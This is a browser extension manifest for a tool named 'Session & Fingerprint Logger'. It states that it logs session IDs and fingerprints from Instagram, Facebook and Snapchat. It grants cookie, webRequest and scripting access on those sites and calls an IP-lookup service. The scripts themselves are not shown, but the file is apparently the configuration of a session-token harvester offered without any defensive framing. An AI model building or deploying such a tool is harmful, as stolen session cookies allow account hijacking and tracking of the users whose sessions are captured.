{
  "manifest_version": 3,
  "name": "Session & Fingerprint Logger",
  "version": "1.0",
  "description": "Logs fingerprint and session IDs from IG/FB/SC",
  "permissions": ["cookies", "webRequest", "webNavigation", "scripting"],
  "host_permissions": [
    "*://*.instagram.com/*",
    "*://*.facebook.com/*",
    "*://*.snapchat.com/*",
    "https://api.ipify.org/*"
  ],
  "background": {
    "service_worker": "background.js",
    "type": "module"
  },
  "content_scripts": [
    {
      "matches": [
        "*://*.instagram.com/*",
        "*://*.facebook.com/*",
        "*://*.snapchat.com/*"
      ],
      "js": ["content.js"],
      "run_at": "document_idle"
    }
  ],
  "icons": {
    "48": "icons/48.png",
    "128": "icons/128.png"
  },
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self';"
  }
}
